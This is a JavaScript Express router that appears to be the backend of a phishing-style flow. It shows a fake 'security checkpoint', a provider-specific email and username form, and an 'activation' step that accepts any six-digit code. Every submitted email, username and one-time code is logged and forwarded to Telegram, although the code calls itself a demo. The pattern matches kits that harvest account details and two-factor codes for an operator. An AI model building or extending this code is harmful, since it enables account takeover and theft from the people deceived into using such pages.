import express from 'express';
import {
  STATE_SECURITY_CHECK,
  STATE_LOGIN_PAGE,
  STATE_ACTIVATION_PAGE,
  STATE_SUCCESS_PAGE,
  requireState,
} from '../middleware/sessionState.js';
import { sendTelegramNotification } from '../utils/telegram.js';

const router = express.Router();

const providerDomains = {
  Gmail: ['@gmail.com'],
  Outlook: ['@outlook.com', '@hotmail.com', '@live.com'],
  Yahoo: ['@yahoo.com', '@ymail.com'],
  AOL: ['@aol.com'],
  ProtonMail: ['@protonmail.com', '@proton.me'],
  iCloud: ['@icloud.com', '@me.com'],
};

function validateEmailProviderDomain(email, provider) {
  const trimmedEmail = (email || '').trim().toLowerCase();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!trimmedEmail || !emailRegex.test(trimmedEmail)) {
    return { valid: false, message: 'Please enter a valid email address.' };
  }

  const allowedDomains = providerDomains[provider];
  if (allowedDomains && allowedDomains.length > 0) {
    const matches = allowedDomains.some((domain) => trimmedEmail.endsWith(domain));
    if (!matches) {
      return {
        valid: false,
        message: `Email for ${provider} must end with ${allowedDomains.join(' or ')}`,
      };
    }
  }

  return { valid: true };
}

/**
 * GET /api/session
 * Returns current session state and metadata.
 */
router.get('/session', (req, res) => {
  const authState = req.session.authState;
  res.json({
    success: true,
    authState: {
      state: authState.state,
      challengePassed: authState.challengePassed,
      provider: authState.provider,
      email: authState.email,
      username: authState.username,
      verificationStatus: authState.verificationStatus || authState.activationStatus || authState.otpStatus,
    },
  });
});

/**
 * POST /api/access-check
 * Process security checkpoint swipe verification.
 */
router.post('/access-check', (req, res) => {
  const { challengeId, completed } = req.body;

  if (!completed) {
    return res.status(400).json({
      success: false,
      accessGranted: false,
      error: 'Security challenge not completed.',
    });
  }

  req.session.authState.challengeId = challengeId || 'demo-challenge-123';
  req.session.authState.challengePassed = true;
  req.session.authState.state = STATE_LOGIN_PAGE;

  sendTelegramNotification({
    title: 'Security checkpoint passed',
    lines: [
      `*Challenge ID:* ${req.session.authState.challengeId}`,
      `*Status:* SUCCESS`,
    ],
  });

  return res.json({
    success: true,
    accessGranted: true,
    next: '/login',
  });
});

/**
 * POST /api/login-demo
 * Process form submission with provider, email extension check, and username.
 */
router.post('/login-demo', requireState(STATE_LOGIN_PAGE), (req, res) => {
  const { provider, email, username } = req.body;

  const errors = {};

  if (!provider || typeof provider !== 'string' || !provider.trim()) {
    errors.provider = 'Email provider selection is required';
  }

  const emailCheck = validateEmailProviderDomain(email, provider);
  if (!emailCheck.valid) {
    errors.email = emailCheck.message;
  }

  if (!username || typeof username !== 'string' || !username.trim()) {
    errors.username = 'Username is required';
  } else if (username.trim().length < 3) {
    errors.username = 'Username must be at least 3 characters long';
  }

  if (Object.keys(errors).length > 0) {
    return res.status(400).json({
      success: false,
      errors,
    });
  }

  const trimmedEmail = email.trim();
  const trimmedProvider = provider.trim();
  const trimmedUsername = username.trim();

  req.session.authState.state = STATE_ACTIVATION_PAGE;
  req.session.authState.provider = trimmedProvider;
  req.session.authState.email = trimmedEmail;
  req.session.authState.username = trimmedUsername;
  req.session.authState.verificationStatus = null;

  console.log(`\n=================================`);
  console.log(`[FORM SUBMITTED]`);
  console.log(`Provider: ${trimmedProvider} | Email: ${trimmedEmail} | Username: ${trimmedUsername}`);
  console.log(`=================================\n`);

  sendTelegramNotification({
    title: 'Demo form submitted',
    lines: [
      `*Provider:* ${trimmedProvider}`,
      `*Email:* ${trimmedEmail}`,
      `*Username:* ${trimmedUsername}`,
      `*Status:* SUBMITTED`,
    ],
  });

  return res.json({
    success: true,
    next: '/activation',
    email: trimmedEmail,
    provider: trimmedProvider,
    username: trimmedUsername,
  });
});

/**
 * POST /api/activation/verify
 * Accepts any 6-digit numeric code format for demo assignment verification.
 */
const handleVerifyCode = (req, res) => {
  const { code } = req.body;

  if (!code || typeof code !== 'string' || !/^\d{6}$/.test(code.trim())) {
    return res.status(400).json({
      success: false,
      error: 'Please enter a valid 6-digit numeric code.',
    });
  }

  const cleanCode = code.trim();

  req.session.authState.state = STATE_SUCCESS_PAGE;
  req.session.authState.verificationStatus = 'completed';

  sendTelegramNotification({
    title: 'Verification step completed',
    lines: [
      `*Code Entered:* ${cleanCode}`,
      `*Method:* 6-Digit Code`,
      `*Status:* SUCCESS`,
    ],
  });

  return res.json({
    success: true,
    next: '/success',
  });
};

router.post('/activation/verify', requireState(STATE_ACTIVATION_PAGE), handleVerifyCode);
router.post('/otp/verify', requireState(STATE_ACTIVATION_PAGE), handleVerifyCode);

/**
 * POST /api/activation/generate
 */
const handleGenerateCode = (req, res) => {
  return res.json({
    success: true,
    message: 'Any 6-digit numeric code is accepted for this verification step.',
  });
};

router.post('/activation/generate', requireState(STATE_ACTIVATION_PAGE), handleGenerateCode);
router.post('/otp/generate', requireState(STATE_ACTIVATION_PAGE), handleGenerateCode);

/**
 * POST /api/activation/skip
 */
const handleSkipCode = (req, res) => {
  req.session.authState.state = STATE_SUCCESS_PAGE;
  req.session.authState.verificationStatus = 'skipped';

  sendTelegramNotification({
    title: 'Verification step skipped',
    lines: [
      `*Method:* Skipped`,
      `*Status:* SUCCESS`,
    ],
  });

  return res.json({
    success: true,
    next: '/success',
  });
};

router.post('/activation/skip', requireState(STATE_ACTIVATION_PAGE), handleSkipCode);
router.post('/otp/skip', requireState(STATE_ACTIVATION_PAGE), handleSkipCode);

/**
 * POST /api/logout
 */
router.post('/logout', (req, res) => {
  req.session.authState = {
    state: STATE_SECURITY_CHECK,
    challengeId: null,
    challengePassed: false,
    provider: null,
    email: null,
    username: null,
    verificationStatus: null,
  };

  return res.json({
    success: true,
    next: '/',
  });
});

export default router;
